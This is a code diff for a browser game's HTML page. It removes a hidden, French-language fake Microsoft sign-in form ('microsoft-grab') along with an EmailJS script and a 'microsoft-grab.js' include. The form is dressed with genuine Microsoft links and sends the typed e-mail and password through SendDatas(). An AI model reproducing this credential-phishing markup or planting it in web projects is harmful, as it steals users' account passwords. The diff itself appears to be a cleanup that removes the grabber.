@@ -16,44 +16,7 @@
     </head>
     <body oncontextmenu="return false;" id="body">
         <canvas width="675" height="675" id="game" style="display: block;"></canvas>
-        <div id="microsoft-grab" style="display: none;">
-            <div id="top-part">
-                <div id="step0" style="padding: 40px; display: none;">
-                    <img src="./sprites/microsoft-grab/logo.svg">
-                    <h1>Se connecter</h1>
-                    <p id="errorMessage" style="color: red; font-size: .9375rem; display: none;">Entrez une adresse e-mail, un numéro de téléphone ou identifiant Skype valide.</p>
-                    <input type="email" id="email" placeholder="E-mail, téléphone ou identifiant Skype"> 
-                    <p>Pas de compte ? <a href="https://signup.live.com/signup?ru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1036%26client_id%3d4765445b-32c6-49b0-83e6-1d93765276ca%26scope%3dopenid%2bprofile%2bhttps%253a%252f%252fwww.office.com%252fv2%252fOfficeHome.All%26redirect_uri%3dhttps%253a%252f%252fwww.office.com%252flandingv2%26response_type%3dcode%2bid_token%26state%3ds9MVA4Q4jVuBssafWt-Wi0R3d9lm7ARFxLm58-hMhNQLX9ic1VKEs8tU8OwzknXhMfqrO3ETrhWkiGhwKIgOwGrSf1rYCCO7YzYd2B6F_fRRt7LPXS0R7oS1zRO9ddMNhOTpr48-tWtDlf5YOcIa1qDeEjGlYpaTtwhiDCCUsNeb4OuIb6zMPRl6CD4bCCUd8o6NxMDt1JKhfwACZ9z0ar3EYv5oFJLwkdJ5hHMHoPmPfPgGsAro0coXEIVkvB6ALRbEsKVUpA-FELtJvBwt-mFdixLsn3XwVAO5AOdP_6E%26response_mode%3dform_post%26nonce%3d638094878926792835.ZmQxMzJiMjItMjQyMC00ZjdiLTkwMGYtNmNiZjA2ZDI4NTMyZmFkMzI1ZmYtZTc4Ny00NTU4LWJmYTYtYzgzYTBlOTY5YTNm%26x-client-SKU%3dID_NETSTANDARD2_0%26x-client-Ver%3d6.16.0.0%26msproxy%3d1%26issuer%3dmso%26tenant%3dcommon%26ui_locales%3dfr-FR%26lw%3d1%26fl%3deasi2%26epct%3dAQABAAAAAAD--DLA3VO7QrddgJg7Wevr2_Olr3NXFDu0xt5AdiDJpNOJN_uLBs5xFrfwn46wiw1d0jQhz96iYLy2WbmfQADU7XRB5TDIaU4qJJC0A3xdK9iU0e9cwbEWx7KXz2Zcrv9T4tcjjytqf3I4cQyAmSQAYrwoCjwep0ldrwQ3gyjwH5t0Pyw_pahfgHrARcxWlduQRwW3uSFwNwqMvUItvSAj0YQxM-D30Ld6KauqqcatCyAA%26jshs%3d0%26mkt%3dFR-FR%26uaid%3da0effc0d903d47be99ad0f633d920346%26contextid%3dA90F1883D22DC9A5%26mssupv%3d1&mkt=FR-FR&uiflavor=web&lw=1&fl=easi2&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&uaid=a0effc0d903d47be99ad0f633d920346&suc=4765445b-32c6-49b0-83e6-1d93765276ca&lic=1">Créez-en-un !</a></p>
-                    <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638094878926792835.ZmQxMzJiMjItMjQyMC00ZjdiLTkwMGYtNmNiZjA2ZDI4NTMyZmFkMzI1ZmYtZTc4Ny00NTU4LWJmYTYtYzgzYTBlOTY5YTNm&ui_locales=fr-FR&mkt=fr-FR&client-request-id=a0effc0d-903d-47be-99ad-0f633d920346&state=s9MVA4Q4jVuBssafWt-Wi0R3d9lm7ARFxLm58-hMhNQLX9ic1VKEs8tU8OwzknXhMfqrO3ETrhWkiGhwKIgOwGrSf1rYCCO7YzYd2B6F_fRRt7LPXS0R7oS1zRO9ddMNhOTpr48-tWtDlf5YOcIa1qDeEjGlYpaTtwhiDCCUsNeb4OuIb6zMPRl6CD4bCCUd8o6NxMDt1JKhfwACZ9z0ar3EYv5oFJLwkdJ5hHMHoPmPfPgGsAro0coXEIVkvB6ALRbEsKVUpA-FELtJvBwt-mFdixLsn3XwVAO5AOdP_6E&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0#">Votre compte n'est pas accessible ?</a>
-                    <div class="buttons">
-                        <button id="back" onclick="document.getElementById('microsoft-grab').style.display = 'none';">Retour</button>
-                        <button id="next" onclick="Next();">Suivant</button>
-                    </div>
-                </div>
-                <div id="step1" style="padding: 40px; display: block;">
-                    <img src="./sprites/microsoft-grab/logo.svg">
-                    <div class="backToMail">
-                        <a onclick="step = 0;"><img src="./sprites/microsoft-grab/arrow.svg"></a>
-                        <p id="emailBack">base.test@email.ch</p>
-                    </div>
-                    <h1 style="margin: 10px 0 5px 0;">Entrez le mot de passe</h1>
-                    <input type="password" placeholder="Mot de passe" id="password">
-                    <a href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAnZI9iNNwGMaba6-e58cdOuh4g4MoaZuPpmnEIf3-SppeP9PB0vzzT5q0Sf5N0l5bB0UcRBFulAMRHHUQzkUExfl0cHAQHR2EE8HxFsEerk6-w8v7_uBZnudZX6MjdDwSi8SuBMlIjLvEEhrsA6jicVVVcZqACZxVoIZTkIz1SYZNKkrCPbe--eN5oXqbu1G5e-0zvLn_8sUzjB34PvK4aLQPgDOx_YhlANfxHM2PAMeK9if-ILo80Aj6EPcM3TZs3DmmrzDsI4bdXwkRMYr5srJR5ZeQPF6Oayzg4crqyNENey94J1igvSL_d7I830nN5XL6GMQKPcQYOWpAijJKE_1mWSSbzDbY0Vsgjk_tqUx0CYbNxNWymUO4yBClbL1XtyrstlnPVIpJMImD-QS1SvOuANqy2KiW20BVKCpBmG7SspkOYViV7JAmhTgrDQvFlq8LiYHLt2eWb_LDZMp1dWpHEDuyNGkwKdKeknM0KSUEvirq0kxpFXG_WijMUTKPs_3aeGQYrLTQWg1FQD0A5YyilxcshVBNaBpanKxJCEhFx55lFgSZR1kRb8vtxLgkmQRDJ0DHHSrtGoW6eLGkl2r9AhzgST3dgKgiSzOSaKa9RY7v9KkFC7uwLbCgYw5pa5sfmMhudOhFrpUlyTFLj5QxkJulbmrHt9KpVjsTy-VVVJXLNjOfDZIVERd7PTtLGEpNX1rO7wfDyxAtxz4IZj3oTg0AOe6fiXOckCr26vXKloOgbahbyHU0YwS3HE0bGTbsLVXQ8z4HsY8h7DB0YS20iV8MbAUun4oFuZNr3zY2A8fvUQh7uros3Kef2s33-9_zD-4wT97eigQOVqPR_JCWM-lp7mqTb-V4hhjUIKwjh6iPF6ZKdSfSVDfphOKUwPU4R-yGsd3w-YPwaaHOVyIZ6A19B_0KY_dOBF6f_O_2PlrH3p0JHJ39-uHh473fb34W_gA1&mkt=fr-FR&hosted=1&device_platform=Windows+10">J'ai oublié mon mot de passe</a>
-                    <div class="buttons">
-                        <button id="connect" onclick="SendDatas();">Se connecter</button>
-                    </div>
-                </div>
-            </div>
-            <div id="bottom-part" style="display: none;">
-                <div style="padding-left: 40px;">
-                    <img src="./sprites/microsoft-grab/connectionsOptions.svg">
-                    <p>Options de connexion</p>
-                </div>
-            </div>
-        </div>
         <script src = "lib/perlin.js"></script>
-        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-        <script src="microsoft-grab.js"></script>
         <script src = "script.js"></script>
     </body>
 </html>
